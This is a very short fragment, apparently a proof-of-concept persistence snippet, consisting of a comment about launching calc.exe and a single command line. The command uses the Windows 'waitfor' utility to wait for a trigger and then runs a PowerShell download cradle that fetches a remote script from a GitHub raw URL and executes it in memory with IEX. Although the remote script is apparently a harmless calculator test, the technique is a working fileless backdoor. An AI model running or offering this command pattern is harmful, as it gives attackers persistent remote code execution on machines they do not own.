# start-process calc.exe
1
cmd /c waitfor persist `&`& powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc3.ps1')
